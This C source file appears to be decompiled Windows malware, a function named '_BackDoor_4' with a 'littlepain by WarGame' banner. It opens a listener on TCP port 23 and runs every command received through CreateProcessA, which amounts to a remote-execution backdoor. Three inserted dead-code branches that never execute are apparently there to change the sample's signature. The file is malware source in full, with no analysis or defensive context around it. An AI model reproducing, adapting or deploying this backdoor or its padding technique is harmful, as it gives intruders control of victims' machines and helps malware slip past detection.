#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

DWORD WINAPI _BackDoor_4(LPVOID Data)
{
    int iVar1;
    uint32_t uVar2;
    BOOL BVar3;
    PROCESS_INFORMATION local_28c;
    STARTUPINFOA local_27c;
    char local_238[260];
    fd_set local_134;
    struct timeval local_30;
    struct sockaddr_in local_28;
    SOCKET local_18;
    SOCKET local_14;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            for (volatile DWORD i = 0; i < 2; i++) {
                hash = (hash << 5) - hash + si.dwPageSize;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    local_14 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (local_14 != INVALID_SOCKET) {
        local_28.sin_family = AF_INET;
        local_28.sin_addr.s_addr = htonl(INADDR_ANY);
        local_28.sin_port = htons(23);
        iVar1 = bind(local_14, (struct sockaddr *)&local_28, sizeof(struct sockaddr_in));
        if (iVar1 != -1) {
            listen(local_14, SOMAXCONN);
            do {
                local_18 = accept(local_14, NULL, NULL);
                local_30.tv_usec = 0;
                local_30.tv_sec = 60;
                local_134.fd_count = 1;
                local_134.fd_array[0] = local_18;

                // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
                if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
                    char *tmp = (char *)malloc(64);
                    if (tmp != NULL) {
                        strcpy(tmp, "dummy");
                        volatile DWORD len = strlen(tmp);
                        volatile BYTE check = 0;
                        for (volatile DWORD i = 0; i < len; i++) {
                            check ^= tmp[i];
                        }
                        volatile DWORD j = 0;
                        while (j < 2) {
                            check += j;
                            j++;
                        }
                        // additional dummy operation
                        char tmp2[32];
                        memcpy(tmp2, tmp, 4);
                        volatile DWORD val = (DWORD)tmp2[0] + check;
                        val += len;
                        free(tmp);
                    }
                }

                send(local_18, "[:: littlepain ::] by WarGame\r\n", 31, 0);
                while (iVar1 = select(local_18 + 1, &local_134, NULL, NULL, &local_30), iVar1 > 0) {
                    memset(local_238, 0, sizeof(local_238));
                    recv(local_18, local_238, sizeof(local_238), 0);
                    uVar2 = strlen(local_238);
                    for (uint32_t local_10 = 0; local_10 < uVar2; local_10++) {
                        if ((local_238[local_10] == '\r') || (local_238[local_10] == '\n')) {
                            local_238[local_10] = '\0';
                        }
                    }
                    memset(&local_27c, 0, sizeof(local_27c));
                    memset(&local_28c, 0, sizeof(local_28c));
                    local_27c.cb = sizeof(STARTUPINFOA);
                    local_27c.dwFlags = STARTF_USESHOWWINDOW;
                    local_27c.wShowWindow = SW_SHOW;
                    BVar3 = CreateProcessA(NULL, local_238, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &local_27c, &local_28c);
                    if (BVar3 == 0) {
                        send(local_18, "Not Executed!\r\n", 15, 0);
                    }
                    else {
                        send(local_18, "Executed!\r\n", 11, 0);
                    }
                }
                closesocket(local_18);
            } while (true);
        }
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        // extra dummy math
        volatile DWORD extra = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra += (hash >> i) & 0xFF;
        }
        extra ^= dummy_array[3];
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return 0;
}
